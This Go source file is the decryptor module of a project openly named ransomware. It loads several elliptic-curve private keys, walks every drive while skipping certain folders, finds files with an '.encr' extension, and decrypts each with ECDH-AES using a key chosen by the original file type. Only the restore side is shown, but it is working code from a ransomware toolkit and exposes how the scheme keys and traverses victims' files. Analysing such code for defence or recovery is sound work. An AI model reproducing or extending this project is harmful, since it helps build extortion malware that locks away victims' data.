package main

import (
	"crypto/ecdsa"
	"fmt"
	"io/fs"
	"path/filepath"
	"ransomware/encryption"
	"ransomware/encryption/eccLib"
	"ransomware/io"
	"ransomware/utils"
	"strings"
	"sync"
)

var (
	waitGroup sync.WaitGroup
)

func main() {

	var privKeys []*ecdsa.PrivateKey
	var err error

	if privKeys, err = eccLib.ReadMultPrivKeys("keys.pem"); err != nil {
		panic(err)
	}

	// currentDirectory, _ := os.Getwd()
	// dir := string(filepath.Dir(currentDirectory) + "/testFolder")

	// decryptFiles(dir, privKeys)

	drives := utils.GetDrives()
	for _, drive := range drives {
		decryptFiles(drive, privKeys)
	}

}

func decryptFiles(dirPath string, privKeys []*ecdsa.PrivateKey) {

	var filesToVisit = make(chan io.File)
	var ext string
	waitGroup.Add(1)
	go func() {
		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {

			if d.IsDir() {

				if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
					return filepath.SkipDir
				}
			}

			if !d.IsDir() {
				ext = filepath.Ext(path)

				if ext == ".encr" {
					info, err := d.Info()
					if err != nil {
						return err
					}

					split := strings.Split(path, ".")
					if len(split) >= 2 {
						ext = split[len(split)-2]
						filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
					}
				}
			}
			return nil
		})

		defer close(filesToVisit)
		defer waitGroup.Done()
	}()

	waitGroup.Add(1)
	go func() {
		for file := range filesToVisit {

			fileType, mapContains := utils.FileType[file.Extension]
			if mapContains && privKeys[fileType] != nil {
				err := io.DecryptFile(&file, encryption.ECDHAESDecrypt, privKeys[fileType])
				if err != nil {
					fmt.Println("Error decrypting file", file.Path, "Error:", err)
				}
			}

		}
		defer waitGroup.Done()
	}()

	waitGroup.Wait()
}
